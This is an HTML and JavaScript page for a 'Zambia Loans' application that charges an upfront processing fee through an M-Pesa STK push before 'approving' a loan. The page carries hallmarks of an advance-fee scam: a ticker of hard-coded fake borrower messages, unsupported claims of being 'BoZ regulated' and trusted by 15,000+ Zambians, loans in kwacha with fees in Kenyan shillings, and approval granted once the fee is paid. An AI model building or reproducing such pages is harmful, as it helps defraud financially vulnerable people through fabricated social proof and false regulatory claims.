<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
  <title>Apply · Zambia Loans</title>

  <!-- Favicons -->
  <link rel="apple-touch-icon" sizes="192x192" href="icons/icon.192.png">
  <link rel="icon" type="image/png" sizes="512x512" href="icons/icon.512.png">

  <!-- Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <!-- SweetAlert2 -->
  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">

  <style>
    /* ----- ZAMBIA LOANS · MOBILE OPTIMIZED (TIGHTER SPACING) ----- */
    :root {
      --green: #0A6B35;
      --green-light: #2E9B5E;
      --green-soft: #E3F1E7;
      --red: #C62828;
      --orange: #E65100;
      --orange-light: #FFB74D;
      --gold: #F5A623;
      --bg: #F4F9F2;
      --card: #FFFFFF;
      --text-main: #1C281E;
      --text-soft: #4F6654;
      --border-light: rgba(10, 107, 53, 0.2);
      --shadow-card: 0 8px 20px -4px rgba(0, 25, 0, 0.08);
      --radius-card: 16px;
      --radius-element: 12px;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(145deg, #F0F7EC 0%, #E2EDDF 100%);
      color: var(--text-main);
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 12px 10px 30px;
      line-height: 1.4;
    }

    .container {
      max-width: 440px;
      width: 100%;
      margin: 0 auto;
    }

    /* ----- HEADER (scaled for mobile) ----- */
    .app-header {
      margin-bottom: 14px;
    }

    .top-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 8px;
      flex-wrap: wrap;
      gap: 6px;
    }

    .title-line {
      display: flex;
      align-items: baseline;
      gap: 6px;
    }

    .site-title {
      font-size: clamp(1.8rem, 10vw, 2.2rem);
      font-weight: 800;
      letter-spacing: -0.03em;
      background: linear-gradient(145deg, var(--green) 0%, #15803D 70%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      line-height: 1;
    }

    .flag-dots {
      display: flex;
      gap: 4px;
    }
    .flag-dots span {
      width: 8px;
      height: 8px;
      border-radius: 2px;
    }
    .dot-green { background: var(--green); }
    .dot-red { background: var(--red); }
    .dot-orange { background: var(--orange); }
    .dot-black { background: #1E1E1E; }

    .status-chip {
      background: rgba(255,255,255,0.8);
      backdrop-filter: blur(8px);
      padding: 5px 10px;
      border-radius: 30px;
      font-size: 0.7rem;
      font-weight: 600;
      color: #1E3A22;
      border: 1px solid var(--border-light);
      display: flex;
      align-items: center;
      gap: 4px;
      white-space: nowrap;
    }
    .status-chip i {
      color: var(--orange);
      font-size: 0.7rem;
    }

    .welcome-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(255,255,255,0.75);
      backdrop-filter: blur(10px);
      padding: 6px 16px;
      border-radius: 40px;
      margin-top: 6px;
      border: 1px solid rgba(255,255,255,0.9);
      font-weight: 600;
      font-size: 0.85rem;
      color: #1E3A22;
    }
    .welcome-badge i {
      color: var(--orange);
      font-size: 0.9rem;
    }

    /* ----- INFO STRIP (tighter) ----- */
    .info-strip {
      display: flex;
      gap: 8px;
      margin: 14px 0 12px;
    }
    .info-chip {
      background: rgba(255,255,255,0.8);
      backdrop-filter: blur(5px);
      padding: 8px 12px;
      border-radius: 30px;
      font-size: 0.7rem;
      font-weight: 700;
      color: #0F3D1C;
      display: flex;
      align-items: center;
      gap: 6px;
      border: 1px solid var(--border-light);
      flex: 1;
      justify-content: center;
      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
      white-space: nowrap;
    }
    .info-chip i {
      color: var(--green);
      font-size: 0.8rem;
    }

    .ticker-banner {
      background: linear-gradient(105deg, #ffffff 0%, #F6FBF5 100%);
      border-radius: 20px;
      padding: 10px 16px;
      margin-bottom: 16px;
      border: 1px solid var(--border-light);
      box-shadow: var(--shadow-card);
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .ticker-banner i {
      color: var(--orange);
      font-size: 1.1rem;
    }
    .ticker-text {
      flex: 1;
      font-weight: 700;
      font-size: 0.8rem;
      color: #0A3A1F;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* ----- LOAN PANEL (compact) ----- */
    .loan-panel {
      background: var(--card);
      border-radius: var(--radius-card);
      padding: 18px 16px 22px;
      box-shadow: var(--shadow-card);
      border: 1px solid rgba(255,255,255,0.9);
      margin-bottom: 16px;
    }

    .section-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 14px;
    }
    .section-title {
      font-weight: 800;
      font-size: 1.1rem;
      color: #0F3D1C;
    }
    .loan-count-badge {
      background: #FFEAD2;
      padding: 4px 10px;
      border-radius: 30px;
      font-size: 0.7rem;
      font-weight: 700;
      color: #B45309;
    }

    /* Loan grid — smaller gaps */
    .loan-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-bottom: 16px;
    }

    .loan-card-option {
      background: #FDFEFC;
      border-radius: 12px;
      padding: 14px 4px;
      border: 1.5px solid #D4E6D0;
      text-align: center;
      cursor: pointer;
      transition: all 0.15s;
      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
    }
    .loan-card-option.selected {
      border-color: var(--green);
      background: #EBF6E7;
      box-shadow: 0 6px 14px rgba(10, 107, 53, 0.12);
      transform: scale(1.01);
    }
    .loan-amount {
      font-weight: 800;
      font-size: 1.1rem;
      color: #083A1E;
      line-height: 1.2;
    }
    .loan-fee {
      font-size: 0.6rem;
      margin-top: 6px;
      background: rgba(255,255,255,0.7);
      padding: 3px 8px;
      border-radius: 30px;
      display: inline-block;
      font-weight: 600;
      border: 1px solid rgba(230, 81, 0, 0.15);
      color: #B85E00;
    }

    /* Selected summary — compact */
    .selected-summary {
      background: #F2FAF0;
      border-radius: 14px;
      padding: 14px 16px;
      margin: 14px 0 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid rgba(46, 155, 94, 0.25);
    }
    .summary-left {
      display: flex;
      flex-direction: column;
    }
    .summary-label {
      font-size: 0.7rem;
      color: var(--text-soft);
      font-weight: 600;
    }
    .summary-value {
      font-weight: 800;
      font-size: 1.4rem;
      color: #0A3A1F;
    }
    .summary-fee {
      text-align: right;
    }
    .fee-amount {
      font-weight: 800;
      color: var(--orange);
      font-size: 1.1rem;
    }

    /* CTA button */
    .btn-apply {
      width: 100%;
      background: linear-gradient(105deg, var(--green) 0%, #0F8142 100%);
      border: none;
      border-radius: 30px;
      padding: 16px 16px;
      color: white;
      font-weight: 700;
      font-size: 1.1rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 10px 20px -5px rgba(10, 107, 53, 0.25);
      cursor: pointer;
      border: 1px solid rgba(255,255,255,0.2);
      transition: all 0.2s;
    }
    .btn-apply:active {
      transform: scale(0.98);
      background: #0A5A32;
    }
    .btn-apply:disabled {
      opacity: 0.5;
      pointer-events: none;
    }

    /* Trust footer */
    .trust-footer {
      display: flex;
      justify-content: space-around;
      margin-top: 16px;
      color: var(--text-soft);
      font-size: 0.65rem;
      font-weight: 600;
    }
    .trust-footer i {
      margin-right: 3px;
      color: var(--green);
    }

    /* Modal customisation (slightly smaller) */
    .swal2-popup {
      border-radius: 20px !important;
      padding: 24px 18px !important;
      max-width: 360px !important;
    }
    .swal2-title {
      font-size: 1.2rem !important;
    }
    .phone-modal-input {
      padding: 14px 16px !important;
      font-size: 0.95rem !important;
    }

    /* Extra tight for very small screens */
    @media (max-width: 360px) {
      .container { padding: 0 6px; }
      .loan-panel { padding: 16px 12px; }
      .loan-amount { font-size: 1rem; }
      .summary-value { font-size: 1.2rem; }
      .fee-amount { font-size: 1rem; }
      .btn-apply { padding: 14px; font-size: 1rem; }
      .site-title { font-size: 1.7rem; }
    }
  </style>
</head>
<body>
<div class="container">

  <!-- Header -->
  <header class="app-header">
    <div class="top-bar">
      <div class="title-line">
        <h1 class="site-title">Zambia Loans</h1>
        <div class="flag-dots">
          <span class="dot-green"></span>
          <span class="dot-red"></span>
          <span class="dot-black"></span>
          <span class="dot-orange"></span>
        </div>
      </div>
    </div>
    <div class="welcome-badge">
      <i class="fas fa-hand-peace"></i> 
      <span>Hi, <span id="user-name">Customer</span></span>
      <span style="margin-left: 6px; background: var(--orange); color: white; padding: 2px 8px; border-radius: 20px; font-size: 0.65rem;">Get started</span>
    </div>
  </header>

  <!-- Info chips -->
  <div class="info-strip">
    <div class="info-chip"><i class="fas fa-bolt" style="color: #E65100;"></i> Instant</div>
    <div class="info-chip"><i class="fas fa-shield"></i> 256-bit SSL</div>
    <div class="info-chip"><i class="fas fa-leaf"></i> Low interest</div>
  </div>

  <!-- Ticker -->
  <div class="ticker-banner">
    <i class="fas fa-circle-dollar-to-slot"></i>
    <span class="ticker-text" id="ticker-message">🇿🇲 0977****21 borrowed ZMW 2,400 · just now</span>
  </div>

  <!-- Loan panel -->
  <div class="loan-panel">
    <div class="section-header">
      <span class="section-title">Select loan amount</span>
      <span class="loan-count-badge"><i class="fas fa-gem" style="margin-right: 4px;"></i> 12 offers</span>
    </div>

    <!-- Loan grid -->
    <div class="loan-grid" id="loan-grid"></div>

    <!-- Selected summary -->
    <div class="selected-summary" id="summaryBox" style="display: none;">
      <div class="summary-left">
        <span class="summary-label">Loan amount</span>
        <span class="summary-value" id="summaryAmount">ZMW 0</span>
      </div>
      <div class="summary-fee">
        <span class="summary-label">Processing fee</span>
        <div class="fee-amount" id="summaryFee">Ksh 0</div>
      </div>
    </div>

    <!-- Apply CTA -->
    <button class="btn-apply" id="applyBtn" disabled>
      <span>Apply now</span>
      <i class="fas fa-arrow-right"></i>
    </button>

    <div class="trust-footer">
      <span><i class="fas fa-lock"></i> SSL</span>
      <span><i class="fas fa-building-columns"></i> BoZ regulated</span>
      <span><i class="fas fa-clock"></i> 24h disbursement</span>
    </div>
  </div>

  <p style="text-align: center; font-size: 0.65rem; margin-top: 12px; color: var(--text-soft);">
    © Zambia Loans · Trusted by 15,000+ Zambians
  </p>
</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>

<script>
  (function(){
    "use strict";

    // ---------- FIXED LOAN OPTIONS (ZMW 1,000 to 100,000) ----------
    const loanOptions = [
      { amountZMW: 1000, feeKES: 149 },
      { amountZMW: 2500, feeKES: 200 },
      { amountZMW: 5000, feeKES: 280 },
      { amountZMW: 7500, feeKES: 360 },
      { amountZMW: 10000, feeKES: 450 },
      { amountZMW: 15000, feeKES: 580 },
      { amountZMW: 20000, feeKES: 720 },
      { amountZMW: 30000, feeKES: 950 },
      { amountZMW: 40000, feeKES: 1200 },
      { amountZMW: 60000, feeKES: 1550 },
      { amountZMW: 80000, feeKES: 1800 },
      { amountZMW: 100000, feeKES: 2000 }
    ];

    const API_ENDPOINTS = {
      initiatePayment: '/api/initiate-payment',
      verifyPayment: '/api/verify-payment',
      normalizePhone: '/api/normalize-phone'
    };

    const userData = JSON.parse(sessionStorage.getItem('zambiaLoan') || '{}');
    document.getElementById('user-name').textContent = userData.name || 'Customer';

    // Ticker
    const tickerMessages = [
      "🇿🇲 0977****21 borrowed ZMW 2,400 · just now",
      "🇿🇲 0966****33 borrowed ZMW 1,800 · 2 min ago",
      "🇿🇲 0955****78 borrowed ZMW 5,000 · 1 min ago",
      "🇿🇲 0978****12 borrowed ZMW 3,200 · just now",
      "🇿🇲 0967****90 borrowed ZMW 6,500 · 4 min ago",
      "🇿🇲 0954****56 borrowed ZMW 4,100 · 6 min ago"
    ];
    const tickerEl = document.getElementById('ticker-message');
    let tickerIdx = 0;
    function rotateTicker() { tickerEl.textContent = tickerMessages[tickerIdx]; tickerIdx = (tickerIdx+1)%tickerMessages.length; }
    rotateTicker();
    setInterval(rotateTicker, 2500);

    // Render grid
    const grid = document.getElementById('loan-grid');
    const summaryBox = document.getElementById('summaryBox');
    const summaryAmount = document.getElementById('summaryAmount');
    const summaryFee = document.getElementById('summaryFee');
    const applyBtn = document.getElementById('applyBtn');
    
    let selectedLoan = null;

    function formatZMW(amt) { return 'ZMW ' + amt.toLocaleString(); }

    loanOptions.forEach((opt, idx) => {
      const card = document.createElement('div');
      card.className = 'loan-card-option';
      card.dataset.amount = opt.amountZMW;
      card.dataset.fee = opt.feeKES;
      card.dataset.index = idx;
      card.setAttribute('tabindex','0');
      card.setAttribute('role','button');
      card.innerHTML = `
        <div class="loan-amount">${formatZMW(opt.amountZMW)}</div>
        <div class="loan-fee"><i class="fas fa-receipt"></i> Fee Ksh ${opt.feeKES}</div>
      `;
      card.addEventListener('click', () => selectLoanCard(card));
      card.addEventListener('keydown', (e) => { if(e.key==='Enter'||e.key===' ') { e.preventDefault(); selectLoanCard(card); }});
      grid.appendChild(card);
    });

    const loanCards = Array.from(document.querySelectorAll('.loan-card-option'));

    function selectLoanCard(card) {
      loanCards.forEach(c => c.classList.remove('selected'));
      card.classList.add('selected');
      const amt = parseInt(card.dataset.amount);
      const fee = parseInt(card.dataset.fee);
      selectedLoan = { amountZMW: amt, feeKES: fee };
      
      summaryAmount.textContent = formatZMW(amt);
      summaryFee.textContent = `Ksh ${fee}`;
      summaryBox.style.display = 'flex';
      
      applyBtn.disabled = false;
      
      userData.selected_amount_zmw = amt;
      userData.processing_fee_kes = fee;
      sessionStorage.setItem('zambiaLoan', JSON.stringify(userData));
    }

    if (userData.selected_amount_zmw) {
      const prevCard = loanCards.find(c => parseInt(c.dataset.amount) === userData.selected_amount_zmw);
      if (prevCard) {
        prevCard.classList.add('selected');
        selectedLoan = { amountZMW: userData.selected_amount_zmw, feeKES: userData.processing_fee_kes };
        summaryAmount.textContent = formatZMW(selectedLoan.amountZMW);
        summaryFee.textContent = `Ksh ${selectedLoan.feeKES}`;
        summaryBox.style.display = 'flex';
        applyBtn.disabled = false;
      }
    }

    function isValidKenyanPhone(phone) {
      return /^(?:\+?254|0)?[17]\d{8}$/.test(phone.replace(/\s+/g,''));
    }

    async function normalizePhoneNumber(phone) {
      const res = await fetch(API_ENDPOINTS.normalizePhone, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Phone normalization failed');
      return data.normalized_phone;
    }

    async function initiateSTKPush(phoneNumber, amount, loanAmount) {
      const res = await fetch(API_ENDPOINTS.initiatePayment, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber, amount, loan_amount: loanAmount })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Payment initiation failed');
      return data;
    }

    async function pollPaymentStatus(reference, maxAttempts = 24, intervalMs = 3000) {
      let attempts = 0;
      return new Promise((resolve, reject) => {
        const interval = setInterval(async () => {
          attempts++;
          try {
            const res = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
            const data = await res.json();
            if (!res.ok) console.warn('Verify non-200:', data);
            if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
              clearInterval(interval);
              resolve(true);
            } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
              clearInterval(interval);
              reject(new Error('Payment failed or was cancelled'));
            } else if (attempts >= maxAttempts) {
              clearInterval(interval);
              reject(new Error('Payment verification timeout'));
            }
          } catch (err) {
            if (attempts >= maxAttempts) {
              clearInterval(interval);
              reject(new Error('Payment verification failed'));
            }
          }
        }, intervalMs);
      });
    }

    applyBtn.addEventListener('click', async () => {
      if (!selectedLoan) return;

      const loanSummaryHtml = `
        <div style="background: #F2F8F0; border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left;">
          <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
            <span style="color: #4F6654;">Loan amount</span>
            <strong style="font-size: 1.3rem; color: #0A3A1F;">${formatZMW(selectedLoan.amountZMW)}</strong>
          </div>
          <div style="display: flex; justify-content: space-between;">
            <span style="color: #4F6654;">Processing fee</span>
            <strong style="color: #E65100; font-size: 1.2rem;">Ksh ${selectedLoan.feeKES}</strong>
          </div>
        </div>
        <p style="margin: 10px 0 6px; font-weight: 600; font-size: 0.9rem;">Enter phone for M-Pesa prompt</p>
      `;

      const { value: phoneNumber, isConfirmed } = await Swal.fire({
        title: 'Confirm & pay fee',
        html: `
          ${loanSummaryHtml}
          <input id="swal-phone-input" class="phone-modal-input" type="tel" placeholder="e.g. 0712345678" autocomplete="off" style="width:100%; padding:14px; border-radius:12px; border:1.5px solid #DCE8DA;">
          <p style="font-size: 0.7rem; color: #4F6654; margin-top: 6px;"><i class="far fa-check-circle"></i> STK push will be sent to this number</p>
        `,
        icon: false,
        showCancelButton: true,
        confirmButtonText: 'Pay Now',
        cancelButtonText: 'Cancel',
        confirmButtonColor: '#0A6B35',
        preConfirm: () => {
          const input = document.getElementById('swal-phone-input');
          const phone = input.value.trim();
          if (!phone) {
            Swal.showValidationMessage('Phone number is required');
            return false;
          }
          if (!isValidKenyanPhone(phone)) {
            Swal.showValidationMessage('Enter a valid Kenyan number (07xx / +254)');
            return false;
          }
          return phone;
        }
      });

      if (!isConfirmed) return;

      const rawPhone = phoneNumber;

      Swal.fire({
        title: 'Initiating payment',
        html: 'Please wait — sending M-Pesa prompt...',
        allowOutsideClick: false,
        didOpen: () => Swal.showLoading()
      });

      try {
        const normalizedPhone = await normalizePhoneNumber(rawPhone);
        const paymentResponse = await initiateSTKPush(normalizedPhone, selectedLoan.feeKES, selectedLoan.amountZMW);
        if (!paymentResponse || !paymentResponse.reference) throw new Error('No reference');

        const paymentReference = paymentResponse.reference;

        Swal.fire({
          title: 'STK Push Sent',
          html: `
            <div style="text-align:center">
              <i class="fas fa-mobile-alt" style="font-size:40px;color:#0A6B35;margin-bottom:10px"></i>
              <p>Check your phone and enter PIN.</p>
              <p style="color:#4F6654;">Verifying payment...</p>
            </div>
          `,
          icon: false,
          showConfirmButton: false,
          allowOutsideClick: false
        });

        const paymentSuccess = await pollPaymentStatus(paymentReference, 24, 3000);

        if (paymentSuccess) {
          await Swal.fire({
            title: 'Payment Received',
            html: `<div style="text-align:center"><i class="fas fa-check-circle" style="font-size:56px;color:#22c55e;"></i><p>Approving loan...</p></div>`,
            icon: false,
            showConfirmButton: false,
            timer: 1700
          });

          const finalData = {
            ...userData,
            phone_number: rawPhone,
            normalized_phone: normalizedPhone,
            loan_amount_zmw: selectedLoan.amountZMW,
            fee_paid_kes: selectedLoan.feeKES,
            payment_reference: paymentReference,
            approvedAt: new Date().toISOString()
          };
          sessionStorage.setItem('loanApproved', JSON.stringify(finalData));
          window.location.href = 'dash.html';
        } else {
          throw new Error('Payment not confirmed');
        }
      } catch (err) {
        Swal.fire({
          title: 'Payment Failed',
          html: `<p>${err.message || 'Please try again.'}</p>`,
          icon: 'error',
          confirmButtonColor: '#0A6B35'
        });
      }
    });

    grid.addEventListener('keydown', (e) => {
      const focusable = loanCards;
      const idx = focusable.indexOf(document.activeElement);
      if (idx === -1) return;
      if (e.key === 'ArrowRight' || e.key === 'ArrowDown') {
        e.preventDefault();
        focusable[(idx+1)%focusable.length].focus();
      } else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') {
        e.preventDefault();
        focusable[(idx-1+focusable.length)%focusable.length].focus();
      }
    });

  })();
</script>
</body>
</html>
